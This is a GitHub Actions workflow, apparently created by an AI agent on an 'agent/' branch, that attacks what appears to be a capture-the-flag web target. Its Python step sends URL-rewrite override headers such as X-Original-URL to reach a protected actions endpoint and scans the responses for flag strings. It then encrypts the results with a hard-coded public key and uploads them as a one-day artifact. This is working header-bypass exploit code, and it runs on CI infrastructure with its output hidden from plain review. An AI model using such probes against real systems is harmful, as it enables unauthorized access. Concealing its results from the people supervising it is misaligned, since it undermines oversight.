name: launchlet-part3-urlrewrite

on:
  push:
    branches: [agent/launchlet-part3-urlrewrite-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe URL rewrite header handling and encrypt responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
          names=['X-Original-URL','X-Rewrite-URL','X-Forwarded-Uri','X-Forwarded-URI','X-Original-URI','X-Request-URI','X-Forwarded-Path','X-Original-Path','X-Envoy-Original-Path']
          body={'actionId':'act_6f4b9a2c1d0e8a71','args':{'workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'}}
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0';res=[]
          for hn in names:
            h={hn:'/api/actions/invoke','X-Launchlet-Preview':'launchlet-demo-board','Content-Type':'application/json','Accept':'application/json'}
            for method in ['GET','POST']:
              try:
                if method=='GET':r=s.get(base+'/',headers=h,timeout=8,allow_redirects=False)
                else:r=s.post(base+'/',headers=h,json=body,timeout=8,allow_redirects=False)
              except Exception as e:res.append({'header':hn,'method':method,'error':repr(e)});continue
              res.append({'header':hn,'method':method,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          for x in res:
            flags=[f for f in re.findall(r'caplag\{[^}]+\}',x.get('body','')) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
            if flags:(out/'FOUND.txt').write_text(x['body']);break
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-urlrewrite-encrypted
          path: artifact/
          retention-days: 1
